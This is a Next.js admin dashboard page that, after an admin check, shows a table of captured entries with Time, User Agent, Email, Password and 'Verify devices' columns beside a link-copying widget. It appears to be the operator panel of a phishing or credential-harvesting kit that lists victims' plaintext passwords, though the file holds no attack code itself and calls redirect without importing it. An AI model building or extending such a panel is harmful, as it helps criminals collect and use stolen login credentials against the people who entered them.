import LinkCopy from "@/components/LinkCopy";
import Navbar from "@/components/Navbar";
import connectDB from "@/db";
import User from "@/db/User.Model";
import DashboardDataTable from "@/components/DashboardDataTable";
import { authCheck } from "@/actions";
import DoNotHavePermission from "@/components/DoNotHavePermission";
import DashboardPagination from "@/components/DashboardPagination";

export default async function Page() {
  let { id } = await authCheck();
  await connectDB();
  let user = await User.findOne({ _id: id });
  if (!user) {
    redirect("/log-in");
  }
  if (!user.admin) {
    return <DoNotHavePermission />;
  }

  return (
    <>
      <Navbar admin={true} />
      <div className="flex items-center flex-col justify-center ">
        <div className="w-full">
          <LinkCopy />
        </div>
        <div className="w-full sm:w-2/3">
          <div className="overflow-x-auto">
            <table className="w-full min-w-full text-nowrap  border-collapse">
              <thead>
                <tr>
                  <th className="px-4 border py-2">Time</th>
                  <th className="px-4 border py-2">User Agent</th>
                  <th className="px-4 border py-2">Email</th>
                  <th className="px-4 border py-2">Password</th>
                  <th className="px-4 text-nowrap border py-2">
                    Verify devices
                  </th>
                </tr>
              </thead>
              <DashboardDataTable admin={true} />
            </table>
          </div>
          <DashboardPagination />
        </div>
      </div>
    </>
  );
}
